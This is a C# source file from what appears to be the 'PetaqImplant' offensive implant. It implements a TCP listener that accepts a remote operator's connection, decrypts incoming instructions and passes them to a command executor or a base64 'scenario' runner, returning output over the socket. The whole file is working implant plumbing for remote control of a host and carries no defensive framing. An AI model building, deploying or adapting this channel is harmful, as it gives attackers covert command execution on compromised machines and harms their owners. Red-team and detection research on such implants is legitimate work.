using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;

using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.IO.Pipes;
using System.Security.Principal;
using System.Security.AccessControl;

namespace PetaqImplant
{
    public class TCPServiceSocket : ImplantServiceSocket
    {
        public int ListenPort { get; set; }
        public TcpListener TCPService { get; set; }
        public TcpClient TCPClient { get; set; }
        public StreamString TCPClientStream { get; set; }


        public override void Start()
        {
            try
            {
                // Setting up the variables for listener
                ListenPort = int.Parse(Program.configuration["LISTENPORT"]);

                // Setting the service status
                Status = true;

                // Get a new session link.

                while (Status)
                {
                    // Listener is configuring
                    TCPService = new TcpListener(IPAddress.Any, ListenPort);

                    // Start listening for client requests.
                    TCPService.Start();

                    Console.Error.WriteLine("Waiting for linking... ");

                    // Perform a blocking call to accept requests.
                    TCPClient = TCPService.AcceptTcpClient();

                    Console.Error.WriteLine("The implant is being linked.");
                    LinkStatus = true;

                    Console.Error.WriteLine("Stopping the service as the implant is being linked.");
                    // Stopping the listener as the implant is being linked.
                    TCPService.Stop();

                    // Read stream as string and process
                    while (LinkStatus)
                    {
                        // Get a stream object for reading and writing
                        NetworkStream stream = TCPClient.GetStream();

                        // Creating StreamString class for string based communications
                        TCPClientStream = new StreamString(stream);

                        //Instruction received from the TCP client...
                        string instruction = TCPClientStream.ReadString();
                        instruction = Common.Decrypt(instruction);

                        // If scenario is requested call scenario, otherwise run instructions
                        if (instruction.StartsWith("scenario"))
                        {
                            if (Regex.Split(instruction," ").Length < 3)
                            {
                                // Set the socket as the Console output
                                Program.consoleIO = Console.Out;
                                Console.SetOut(new SocketWriter());
                                // Raise the error
                                Console.WriteLine("Usage: scenario file filepath");
                            }
                            else
                            {
                                // scenario instruction format:
                                // scenario file BASE64STRING
                                string scenario_b64 = Regex.Split(instruction," ")[2];
                                // send the Base64 encoded scenario to run
                                PetaqImplant.Scenario.Run(scenario_b64);
                            }

                        }
                        else
                        {
                            // run the instruction received
                            PetaqImplant.Instructions.Instruct(instruction, new SocketWriter());
                        }
                    }

                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("TCP Service Exception on Receive: " + e);
                Status = false;
                LinkStatus = false;
            }
            finally
            {
                Stop();
            }
        }

        public override void Stop()
        {

            // Stop listening for new clients.
            if (LinkStatus)
            {
                Console.WriteLine("Closing the TCP linking.");
                TCPClient.Close();
            }
            Console.WriteLine("Stopping the TCP linking service.");
            TCPService.Stop();
            Status = false;
            LinkStatus = false;

        }
        public override bool Send(string data = "")
        {
            if (data == "") return false;
            try
            {

                if (LinkStatus)
                {
                    TCPClientStream.WriteString(data);
                }
                else
                {
                    Console.Error.WriteLine("The TCP service is not linked.");
                }
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("TCP Service Exception on Send: " + e.Message + e.StackTrace);
                return false;
            }
        }
    }
}
